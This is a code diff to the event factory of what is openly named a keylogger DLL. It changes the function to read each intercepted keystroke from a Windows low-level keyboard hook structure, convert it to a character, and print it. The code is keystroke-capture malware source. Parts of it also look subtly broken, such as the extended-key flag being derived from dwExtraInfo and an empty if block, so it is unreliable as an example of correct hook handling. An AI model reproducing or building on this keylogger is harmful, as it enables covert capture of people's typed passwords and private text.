@@ -4,6 +4,7 @@
 
 
 #include "keylogger_dll/EventFactory.h"
+#include <bitset>
 
 /**
  * EventFactory implementation
@@ -21,17 +22,25 @@ EventFactory::EventFactory() {
  * @param WPARAM wparam from hook
  * @return AEvent* the event created
  */
-const AEvent* EventFactory::create(LPARAM lparam, WPARAM wparam, t_Context context) {
+const AEvent* EventFactory::create(WPARAM wParam, LPARAM lParam, t_Context context) {
 	std::chrono::time_point<std::chrono::system_clock> time;
 	time = std::chrono::system_clock::now();
-		
-	std::chrono::milliseconds ms = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch());
-	int vkKeyCode = wparam;
+
+	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
+	int c; 
+	if ((c = MapVirtualKey(p->vkCode, MAPVK_VK_TO_CHAR)) == 0)
+	{
+	}
+	std::cout << "Touche=" << (char)c << std::endl;
 	int repeatCount = 0;
-	int scanCode = 0;
-	bool extend = 0;
+	context._ms = p->time;
+	int scanCode = p->scanCode;
+	int vkKeyCode = p->vkCode;
+	DWORD tmp = p->dwExtraInfo;
 	bool alt = 0;
+	bool extend = (tmp > 36);
 	bool prevKeyState = 0;
 	bool transState = 0;
-    return new AEvent(vkKeyCode, repeatCount, scanCode, extend, alt, prevKeyState, transState, ms, context);
+	//std::cout << "vkCode=" << vkKeyCode << "|scanCode=" << scanCode << "| at Time = " << context._ms << " |extraInfo=" << p->dwExtraInfo << "|wParam=" << wParam << "|lParam" << lParam  << std::endl;
+    return new AEvent(vkKeyCode, repeatCount, scanCode, extend, alt, prevKeyState, transState, context);
 }
